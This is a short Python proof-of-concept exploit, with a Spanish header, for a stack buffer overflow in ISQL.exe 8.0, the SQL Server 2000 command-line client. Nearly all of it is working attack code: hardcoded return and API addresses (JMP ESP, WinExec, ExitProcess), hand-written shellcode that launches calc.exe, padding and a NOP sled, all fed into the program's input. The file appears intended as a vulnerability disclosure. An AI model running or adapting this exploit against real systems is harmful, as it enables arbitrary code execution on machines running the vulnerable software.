# ISQL.exe Version: 8.0 - buffer overflow
# Fecha: 10/06/2017
# Bug encontrado por: Martin Torres
# Autor del Exploit: Martin Torres
# E-Mail: mtorres@id.com.py
# Linkedin: https://www.linkedin.com/in/martin-torres-b4454175/ 
# Descripci√≥n: ISQL es una herramienta de linea de comandos para interactuar en modo consola 
# con sql server en su version 2000
# Vulnerabilidad : Buffer Overflow , SEH buffer overflow

import subprocess,struct 
ret_eip = struct.pack('<L', 0x741673A8) #  JMP ESP KERNELBASE.dll
WinExec = struct.pack('<L', 0x762953b0)   
ExitProcess = struct.pack('<L', 0x7625e070)  
shellcode = "\xEB\x1B\x5B\x33\xC9\x51\x88\x4B\x08\x41\x5A\x51\x53\xBB" + WinExec  
shellcode = shellcode + "\xFF\xD3\x52\xB8"+ExitProcess+"\xFF\xD0\xc3\xE8\xE0\xFF\xFF" 
shellcode = shellcode +  "\xFF\x63\x61\x6C\x63\x2E\x65\x78\x65\x23" 
nop = "\x90" * 196
exploit = "A" * 96 + ret_eip + shellcode + nop 
s = subprocess.Popen('isql.exe', stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.STDOUT)
s.stdin.write(exploit + "\n")
out = s.stdout.readline()
print(out)
testresult = s.communicate()[0]
print(testresult)

 
 


